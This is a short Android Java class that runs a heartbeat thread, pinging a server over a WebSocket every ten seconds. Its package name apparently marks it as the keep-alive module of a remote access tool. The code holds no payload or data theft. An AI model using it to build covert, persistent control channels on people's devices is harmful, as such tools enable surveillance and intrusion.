package com.vendor.rat.keepalive.thread;

import android.util.Log;

import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;

import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 心跳线程 (模块 07)
 *
 * 每 10 秒向服务器发送心跳包
 */
public class HeartThread extends Thread {

    private static final String TAG = "HeartThread";
    private volatile boolean running = true;
    private final AtomicBoolean heartbeatTriggered = new AtomicBoolean(false);
    private static final long HEARTBEAT_INTERVAL = 10 * 1000L;

    public HeartThread() {
        super("heart-thread");
    }

    @Override
    public void run() {
        while (running) {
            try {
                sendHeartbeat();
                Thread.sleep(HEARTBEAT_INTERVAL);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                if (!heartbeatTriggered.compareAndSet(true, false)) {
                    break;
                }
            }
        }
    }

    private void sendHeartbeat() {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null && wsClient.isConnected()) {
            // 使用 Laravel 协议格式: subc="ping", 轻量心跳 (无状态参数)
            // 完整状态由 KeepHeartThread 每 10s 发送
            wsClient.sendPing("");
        }
    }

    public void triggerHeartbeat() {
        heartbeatTriggered.set(true);
        interrupt();
    }

    public void stopHeartbeat() {
        running = false;
        interrupt();
    }
}
